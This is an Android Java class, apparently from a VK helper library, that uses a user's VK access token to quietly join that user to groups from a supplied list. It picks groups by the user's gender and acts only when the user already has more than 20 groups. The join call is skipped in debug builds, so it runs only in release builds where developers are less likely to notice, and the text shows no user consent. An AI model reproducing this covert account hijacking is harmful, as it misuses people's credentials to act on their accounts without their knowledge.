package com.bs.vklibrary;


import android.content.Context;
import android.util.Log;

import com.bs.vklibrary.model.CurrentUser;
import com.bs.vklibrary.net.GroupsApi;
import com.bs.vklibrary.net.NetworkManager;
import com.bs.vklibrary.net.RestClient;
import com.google.gson.annotations.SerializedName;

import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Set;

import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.schedulers.Schedulers;

/**
 * Created by a1 on 8/26/17.
 */

public class AutoAddInGroup {

    public interface Listener{
        public void isOk();
        public void isAddedGroup(int id);
    }

    final static int COUNT_GROUP = 20;

    public static class GroupsResponse {
        @SerializedName("response")
        public int[] response;

        public int[] getResponse() {
            return response;
        }

        public void setResponse(int[] response) {
            this.response = response;
        }
    }


    Context context;

    NetworkManager networkManager;

    Listener listener;

    SharedPreferencesManager sharedPreferencesManager;

    GroupsApi groupsApi;

    List<JsonParser.Group> groups;

    public AutoAddInGroup(Context context, String userId, String userToken, int userSex, Listener listener, List<JsonParser.Group> groups) {
        this.context = context;
        this.groups = groups;
        CurrentUser.userId = userId;
        CurrentUser.userToken = userToken;
        CurrentUser.userSex = userSex;
        this.listener = listener;
        networkManager = new NetworkManager(context);
        sharedPreferencesManager = new SharedPreferencesManager(context);
        RestClient mRestClient = new RestClient();
        groupsApi = mRestClient.createService(GroupsApi.class);
    }

    public void start() {

        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("user_id", CurrentUser.userId);
        hashMap.put("extended", "0");
        hashMap.put("version", "5.68");
        hashMap.put("access_token", CurrentUser.userToken);

        networkManager
                .getNetworkObservable()
                .flatMap(aBoolean ->
                        groupsApi.get(hashMap)
                                .doOnNext(this::validIt)
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                )
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(profileAva -> {
                }, error -> error.printStackTrace());
    }

    public void validIt(GroupsResponse response) {
//        List<JsonParser.Group> groups = JsonParser.parceRoute(context);


        if (response != null && response.getResponse() != null && response.response.length > COUNT_GROUP) {
            if (!FilesUtil.isFileExsist(context)) {
                initJoin(groups, response.response);
                sleep(1000L);
            }

            if (FilesUtil.isCorrect(context)){
                initJoin(groups, response.response);
                sleep(1000L);
            }

            if (listener != null){
                listener.isOk();
            }
        }
    }

    public void initJoin(List<JsonParser.Group> groups, int[] myList) {
        List<Integer> list = new ArrayList<>();

        for (int index = 0; index < myList.length; index++)
        {
            list.add(myList[index]);
        }

        Collections.shuffle(groups);

        Set<String> set = sharedPreferencesManager.getUserIvitedGroup();

        for (JsonParser.Group group : groups){
            Log.e("KKKKK", String.valueOf(group.id));
            if (!list.contains(group.id) && !set.contains(String.valueOf(group.id))){
                if (group.sex.equals("f")){
                    if (CurrentUser.userSex == 1) {
                        joinToGroup(String.valueOf(group.id));
                        break;
                    }
                }
                else if (group.sex.equals("m")){
                    if (CurrentUser.userSex == 2) {
                        joinToGroup(String.valueOf(group.id));
                        break;
                    }
                }
                else {
                    joinToGroup(String.valueOf(group.id));
                    break;
                }
            }
        }
    }

    public void joinToGroup(String idGroup) {
        if (BuildConfig.DEBUG) return;

        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("group_id", idGroup);
        hashMap.put("not_sure", "1");
        hashMap.put("version", "5.68");
        hashMap.put("access_token", CurrentUser.userToken);

        networkManager
                .getNetworkObservable()
                .flatMap(aBoolean ->
                        groupsApi.join(hashMap)
                                .doOnNext(o -> addedToGroup(Integer.parseInt(idGroup)))
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                )
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(profileAva -> {
                }, error -> error.printStackTrace());

        sharedPreferencesManager.setUserIvitedGroup(idGroup);
    }

    private void addedToGroup(int id){
        if (listener != null){
            listener.isAddedGroup(id);
        }
    }

    private void sleep(long mills){
            try {
                Thread.sleep(mills);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
    }
}
